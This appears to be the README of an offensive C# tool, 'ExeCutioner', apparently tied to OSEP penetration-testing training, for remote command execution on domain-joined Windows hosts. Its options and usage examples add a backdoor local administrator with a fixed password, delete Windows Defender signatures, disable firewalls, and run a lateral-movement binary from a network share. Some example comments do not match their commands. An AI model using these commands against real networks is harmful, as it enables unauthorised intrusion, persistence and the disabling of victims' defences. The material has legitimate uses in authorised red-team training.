# ExeCutioner


![image](https://user-images.githubusercontent.com/57995347/164892286-a8659b4f-d34b-408a-a7cb-2bee9295f400.png)

Domain-joined Code Executioner

This is a C-Sharp tool written to execute commands on Domain-joined Windows hosts by either taking user supplied creds (username/password) or leveraging the logged-on user's access token.

It was heavily inspired by the OSEP course and leverages code and ideas from https://github.com/chvancooten/OSEP-Code-Snippets
                      
```
ExeCutioner.exe /t <target> /user <username>  /pass <password>  /domain <domain> <command-to-run>
```

Options:
```
/addadmin - adds a local administrator called newguy with password MakeLife123 to target
/cmd - allows for the execution of commands on the target
/domain - allows for the specification of target domain
/noav - deletes Windows Defender's signatures
/nofw - disables all target firewall profiles
/pass - specifies password to use
/t - specifies the target
/syscreds - ignores the user specified and uses the token of the currently logged in user
user - specifies the target user account
```

Usage:
```
ExeCutioner.exe /t <target> /user <username>  /pass <password>  /domain <domain> <command-to-run>

Usage: Examples:
ExeCutioner.exe /?  - show's this help menu 

//Authenticate to target with username and password and disable firewall profiles
ExeCutioner.exe /t <target name or IP> /user <username> /pass <password> /domain <domain> /nofw true

//Authenticate to target with current system token and turn off av
ExeCutioner.exe /t <target name or IP> /user <username> /pass <password> /syscreds true /nofw true

//Authenticate to target with current system token and execute command
ExeCutioner.exe /t <target name or IP> /user <username> /pass <password> /cmd <command-to-run-in-qoutes>

//Authenticate to target with current system token and execute binary for lateral movement
ExeCutioner.exe /t <target name or IP> /user <username> /pass <password> /cmd <\\192.168.10.8\\lateralmovement.exe>
```


